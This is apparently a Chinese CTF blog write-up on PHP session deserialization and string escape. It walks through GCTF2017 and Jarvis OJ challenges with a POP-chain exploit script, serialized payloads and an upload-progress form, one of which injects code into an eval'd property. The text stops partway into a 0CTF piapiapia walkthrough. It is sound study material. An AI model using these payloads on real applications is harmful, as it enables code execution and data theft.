@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 发现自己的反序列化特别是pop链是真的不行，因此接下来要恶补下这一块，这次也是因为做题碰到了session反序列化所以来学习一波。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Session反序列化与字符串逃逸">
+<meta property="og:url" content="http://example.com/2022/03/01/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 发现自己的反序列化特别是pop链是真的不行，因此接下来要恶补下这一块，这次也是因为做题碰到了session反序列化所以来学习一波。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-01T06:58:38.000Z">
+<meta property="article:modified_time" content="2022-03-02T12:25:13.571Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -php">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/01/Session反序列化与字符串逃逸/"/>
+
+
+
+
+
+  <title>Session反序列化与字符串逃逸 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/01/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Session反序列化与字符串逃逸</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-01T14:58:38+08:00">
+                2022-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>发现自己的反序列化特别是pop链是真的不行，因此接下来要恶补下这一块，这次也是因为做题碰到了session反序列化所以来学习一波。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><h2 id="了解php-ini中的Session设置"><a href="#了解php-ini中的Session设置" class="headerlink" title="了解php.ini中的Session设置"></a>了解php.ini中的Session设置</h2><ul>
+<li>session.save_path=”” –设置session的存储路径</li>
+<li>session.save_handler=””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
+<li>session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动</li>
+<li>session.serialize_handler string–定义用来序列化/反序列化的处理器名字，默认使用php</li>
+</ul>
+<h2 id="Session反序列化漏洞的出现"><a href="#Session反序列化漏洞的出现" class="headerlink" title="Session反序列化漏洞的出现"></a>Session反序列化漏洞的出现</h2><p>由于处理器对反序列化的处理方式不同，导致了序列化的储存格式的不同：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php:键名|经过serialize()序列化的值</span><br><span class="line">例如：mrl64|s:6:&quot;hacker&quot;;</span><br><span class="line"></span><br><span class="line">php_binary:键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line">例如：mrl64s:6:&quot;hacker&quot;;</span><br><span class="line"></span><br><span class="line">php_serialize:经过serialize()函数序列化处理的值</span><br><span class="line">例如：a:1:&#123;s:5:&quot;mrl64&quot;;s:6:&quot;hacker&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而如果程序使用两个引擎来分批处理session数列化结构的话，就会导致数据无法正确反序列化，导致可以构造payload绕过一些验证。</p>
+<p>比如我们先存入session变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;mrl64&#x27;] = &#x27;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>在Session文件中的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:5:&quot;mrl64&quot;;s:39:&quot;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们模拟读取，但是用不同的处理器进行处理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class hacker&#123;</span><br><span class="line">    var $hack;</span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        echo $this-&gt;hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们发现会显的是<code>lol</code>，说明<code>__wakeup()</code>魔术方法被触发了，这是由于php处理器会将<code>|</code>前的内容作为键名。</p>
+<h2 id="【GCTF2017】PHP序列化"><a href="#【GCTF2017】PHP序列化" class="headerlink" title="【GCTF2017】PHP序列化"></a>【GCTF2017】PHP序列化</h2><p>审计<code>index.php</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//error_reporting(E_ERROR &amp; ~E_NOTICE);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">header(&quot;content-type;text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;src&#x27;]))&#123;</span><br><span class="line">    $_SESSION[&#x27;src&#x27;] = $_GET[&#x27;src&#x27;];</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    print_r($_SESSION[&#x27;src&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">  &lt;title&gt;代码审计2&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> 在php中，经常会使用序列化操作来存取数据，但是在序列化的过程中如果处理不当会带来一些安全隐患。</span><br><span class="line">&lt;form action=&quot;./query.php&quot; method=&quot;POST&quot;&gt;        </span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;ticket&quot; /&gt;               </span><br><span class="line">&lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=&quot;./?src=1&quot;&gt;查看源码&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接着根据提示访问<code>query.php~</code>读取源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">header(&#x27;Look me: edit by vim ~0~&#x27;)</span><br><span class="line">//......</span><br><span class="line">class TOPA&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $ticket;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        //if($this-&gt;username == $USERNAME &amp;&amp; $this-&gt;password == $PASSWORD)&#123; //抱歉</span><br><span class="line">        $this-&gt;username ==&#x27;aaaaaaaaaaaaaaaaa&#x27; &amp;&amp; $this-&gt;password == &#x27;bbbbbbbbbbbbbbbbbb&#x27;)&#123;</span><br><span class="line">            return &#x27;key is:&#123;&#x27;.$this-&gt;token.&#x27;&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class TOPB&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public $attr;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;attr = null;</span><br><span class="line">        $this-&gt;obj = null;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        $this-&gt;obj = unserialize($this-&gt;attr);</span><br><span class="line">        $this-&gt;obj-&gt;token = $FLAG;</span><br><span class="line">        if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket)&#123;</span><br><span class="line">           return (string)$this-&gt;obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class TOPC&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public $attr;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;attr = null;</span><br><span class="line">        $this-&gt;obj = null;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;attr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现在<code>index.php</code>中进行了<code>ini_set()</code>，而<code>query.php</code>却没有，因此是默认php处理器，符合session反序列化的前置。</p>
+<p>接着观察源码，发现只有TOPC中存在<code>echo</code>，而要让attr能够输出内容需要绕过TOPC中的<code>__wakeup()</code>魔术方法。接着发现TOPB的<code>__toString()</code>魔术方法中存在<code>&amp;FLAG</code>的赋值以及反序列化函数，因此我们要将attr赋值为TOPB对象从而触发这个魔术方法。而if的判断语句中需要<code>$this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket</code>，这里要建立引用关系<code>$a-&gt;ticket = &amp;$a-&gt;token;</code>来绕过判断。而要用到<code>ticket</code>与<code>token</code>则必须调用TOPA类，而要调用TOPA类就必须绕过if判断，但是由于这里是个弱比较，因此我们让username=password=0就可以了，0若等于字符串。</p>
+<p>逻辑理完，构建exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$A = new TOPA();</span><br><span class="line">$B = new TOPB();</span><br><span class="line">$C = new TOPC();</span><br><span class="line">$A -&gt; username = 0</span><br><span class="line">$A -&gt; password = 0</span><br><span class="line">$A -&gt; ticket = &amp;$A-&gt;token;</span><br><span class="line">$s = serialize($A);</span><br><span class="line">$C -&gt; attr = $B;</span><br><span class="line">$B -&gt; attr = $s;</span><br><span class="line">$flag = serialize($C);</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
+
+<p>最后记得要绕过wakeup，并且加上<code>|</code>，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;TOPC&quot;:3:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;O:4:&quot;TOPB&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;s:84:&quot;O:4:&quot;TOPA&quot;:4:&#123;s:5:&quot;token&quot;;N;s:6:&quot;ticket&quot;;R:2;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="无-SESSION变量的赋值"><a href="#无-SESSION变量的赋值" class="headerlink" title="无$_SESSION变量的赋值"></a>无$_SESSION变量的赋值</h2><p>上面的题目中是存在<code>$_SESSION[&#39;src&#39;]</code>进行赋值的，但是在有些题目中是没有的，这时候就要运用到php利用session上传进度了。</p>
+<p>详细可以参考php手册：<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">Session上传进度</a></p>
+<blockquote>
+<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code> session.upload_progress.name</code>连接在一起的值。通常这些键值可以通过读取INI设置来获得</p>
+</blockquote>
+<p>简单说来，就是我们要构建一个表单，同时POST一个与<code>session.upload_process.name</code>同名的变量，后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中，下次请求就会反序列化Session。</p>
+<p>那么我们构建如下表单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xx.xx.xx.xx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;123&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="【Jarvis-OJ】PHPINFO"><a href="#【Jarvis-OJ】PHPINFO" class="headerlink" title="【Jarvis OJ】PHPINFO"></a>【Jarvis OJ】PHPINFO</h2><p>说那么多还是直接看题吧，查看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">	    $this-&gt;mdzz = &#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">	    eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;phpinfo&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#x27;index.php&#x27;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>比起pop链这种看起来就简单清晰多了，当我们随便输入一个值是就会触发<code>__construct()</code>魔术方法，执行phpinfo。查看页面发现存在之前提到的那个问题，因此依然是Session反序列化。</p>
+<p>而这个反序列化的逻辑也是十分简单的，相当于就是执行mdzz的语句，因此我们将<code>phpinfo();</code>替换为<code>print_r(scandir(dirname(__FILE__)));</code>，执行序列化，得到payload，记得要加上<code>|</code>，用反斜杠防止转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后将之前那个表单保存为html格式，随便上传一个文件，然后抓包将文件内容改为payload，然后看到flag文件，去phpinfo中的<code>SCRIPT_FILENAME</code>部分查看包含当前运行脚本的路径，然后用<code>file_get_contents()</code>读取就可以了。</p>
+<h1 id="反序列化的字符串逃逸"><a href="#反序列化的字符串逃逸" class="headerlink" title="反序列化的字符串逃逸"></a>反序列化的字符串逃逸</h1><h2 id="反序列化基本知识"><a href="#反序列化基本知识" class="headerlink" title="反序列化基本知识"></a>反序列化基本知识</h2><p>在理解字符串逃逸之前，我们必须对反序列化有一个前置知识的了解，不过这些内容是比较简单的，因此就大致说一下。</p>
+<p>第一，php反序列化以<code>;&#125;</code>为结尾，并且根据长度判断内容。</p>
+<p>比如我们构造这样一个序列化内容进行反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;s:5:&quot;pass2&quot;;s:6:&quot;123457&quot;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化出的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class __PHP_Incomplete_Class#1 (3) &#123;</span><br><span class="line">  public $__PHP_Incomplete_Class_Name =&gt;</span><br><span class="line">  string(6) &quot;hacker&quot;</span><br><span class="line">  public $name =&gt;</span><br><span class="line">  string(5) &quot;mrl64&quot;</span><br><span class="line">  public $pass =&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出结束后面部分的内容是不会读取的，因此我们可以提前闭合序列化内容使后面的部分丢弃。</p>
+<p>第二，长度不对应会返回<code>bool(false)</code></p>
+<p>这个就比较好理解了，也是为什么反复强调要对应长度，我们将下面这个payload进行反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:7:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>bool(false)</code></p>
+<p>第三，相当重要的一点，反序列化可以反序列类中不存在的元素</p>
+<p>例如我们的类是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class hacker&#123;</span><br><span class="line">    public $name=&#x27;mrl64&#x27;;</span><br><span class="line">    public $pass=&#x27;123456&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们可以构建如下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:3:&quot;age&quot;;s:4:&quot;2333&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其反序列化可以发现，age依然成功反序列化出来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class __PHP_Incomplete_Class#1 (4) &#123;</span><br><span class="line">  public $__PHP_Incomplete_Class_Name =&gt;</span><br><span class="line">  string(6) &quot;hacker&quot;</span><br><span class="line">  public $name =&gt;</span><br><span class="line">  string(5) &quot;mrl64&quot;</span><br><span class="line">  public $pass =&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">  public $age =&gt;</span><br><span class="line">  string(4) &quot;2333&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有了这些知识，我们就可以开始构造字符串逃逸相关的payload了。</p>
+<h2 id="如何构建字符串逃逸"><a href="#如何构建字符串逃逸" class="headerlink" title="如何构建字符串逃逸"></a>如何构建字符串逃逸</h2><p>首先我们要明白一点，字符串逃逸的本质就是改变序列化的长度，无论是变长还是变短，最终的被目的就是为了绕过一些waf。</p>
+<p>核心其实都是一样的，通过题目漏洞构建payload使一些部分由于序列化的长度被识别为键名，从而进行绕过。这样说比较抽象，接下来我们用一道题认识改变字符串长度导致的的字符串逃逸。</p>
+<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>进入网页啥也没发现，测试了下登录框也不存在sql、ssti等注入，因此扫描目录，发现<code>www.zip</code>，下载。</p>
+<p>这个代码审计量有点大，首先是注册和登录，这个比较简单，基本没啥限制，因此先注册登录一个账号。接着是<code>config.php</code>，发现flag内容存在这个文件里面，因此要想办法读取。</p>
+<p>接着就是三个重点文件了，首先是登录成功后的<code>update.php</code>：</p>
